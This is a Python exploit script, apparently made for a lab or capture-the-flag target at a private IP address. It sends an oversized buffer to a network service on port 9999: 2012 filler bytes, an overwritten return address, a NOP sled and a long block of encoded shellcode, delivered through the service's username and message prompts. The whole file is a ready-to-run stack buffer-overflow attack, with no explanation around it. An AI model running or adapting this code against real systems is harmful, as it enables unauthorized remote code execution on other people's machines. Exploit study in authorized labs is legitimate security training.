import socket
import sys

ip = "10.10.219.80"
port = 9999
timeout = 5

offset = 2012
overflow = "A" * offset
retn = "\x0f\x15\x50\x62"
padding = "\x90"*32
payload = ("\xda\xd5\xbe\x83\x3e\x6e\xbf\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x52\x31\x77\x17\x83\xc7\x04\x03\xf4\x2d\x8c\x4a\x06"
"\xb9\xd2\xb5\xf6\x3a\xb3\x3c\x13\x0b\xf3\x5b\x50\x3c\xc3"
"\x28\x34\xb1\xa8\x7d\xac\x42\xdc\xa9\xc3\xe3\x6b\x8c\xea"
"\xf4\xc0\xec\x6d\x77\x1b\x21\x4d\x46\xd4\x34\x8c\x8f\x09"
"\xb4\xdc\x58\x45\x6b\xf0\xed\x13\xb0\x7b\xbd\xb2\xb0\x98"
"\x76\xb4\x91\x0f\x0c\xef\x31\xae\xc1\x9b\x7b\xa8\x06\xa1"
"\x32\x43\xfc\x5d\xc5\x85\xcc\x9e\x6a\xe8\xe0\x6c\x72\x2d"
"\xc6\x8e\x01\x47\x34\x32\x12\x9c\x46\xe8\x97\x06\xe0\x7b"
"\x0f\xe2\x10\xaf\xd6\x61\x1e\x04\x9c\x2d\x03\x9b\x71\x46"
"\x3f\x10\x74\x88\xc9\x62\x53\x0c\x91\x31\xfa\x15\x7f\x97"
"\x03\x45\x20\x48\xa6\x0e\xcd\x9d\xdb\x4d\x9a\x52\xd6\x6d"
"\x5a\xfd\x61\x1e\x68\xa2\xd9\x88\xc0\x2b\xc4\x4f\x26\x06"
"\xb0\xdf\xd9\xa9\xc1\xf6\x1d\xfd\x91\x60\xb7\x7e\x7a\x70"
"\x38\xab\x2d\x20\x96\x04\x8e\x90\x56\xf5\x66\xfa\x58\x2a"
"\x96\x05\xb3\x43\x3d\xfc\x54\x66\xcc\x99\x6d\x1e\xd2\x65"
"\x6b\xe6\x5b\x83\x19\x08\x0a\x1c\xb6\xb1\x17\xd6\x27\x3d"
"\x82\x93\x68\xb5\x21\x64\x26\x3e\x4f\x76\xdf\xce\x1a\x24"
"\x76\xd0\xb0\x40\x14\x43\x5f\x90\x53\x78\xc8\xc7\x34\x4e"
"\x01\x8d\xa8\xe9\xbb\xb3\x30\x6f\x83\x77\xef\x4c\x0a\x76"
"\x62\xe8\x28\x68\xba\xf1\x74\xdc\x12\xa4\x22\x8a\xd4\x1e"
"\x85\x64\x8f\xcd\x4f\xe0\x56\x3e\x50\x76\x57\x6b\x26\x96"
"\xe6\xc2\x7f\xa9\xc7\x82\x77\xd2\x35\x33\x77\x09\xfe\x53"
"\x9a\x9b\x0b\xfc\x03\x4e\xb6\x61\xb4\xa5\xf5\x9f\x37\x4f"
"\x86\x5b\x27\x3a\x83\x20\xef\xd7\xf9\x39\x9a\xd7\xae\x3a"
"\x8f")
buffer = overflow + retn + padding + payload
username = "user"

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # Receive initial server output (welcome + username prompt)
        initial = s.recv(1024)
        print(f"Server (initial): {initial.decode('latin-1', errors='replace')}")
        
        s.sendall(bytes(username + "\n", "latin-1"))  # Send username
        
        # Receive message prompt
        message_prompt = s.recv(1024)
        print(f"Server (message prompt): {message_prompt.decode('latin-1', errors='replace')}")
        
        print(f"Sending evil buffer of {len(buffer)} bytes...")
        s.sendall(bytes(buffer + "\n", "latin-1"))  # Send buffer as message
        
        # Receive server response
        response = s.recv(1024)
        print(f"Server (response): {response.decode('latin-1', errors='replace')}")
        print("Done!")
except Exception as e:
    print("Could not connect or server crashed.")
    print(f"Exception: {e}")
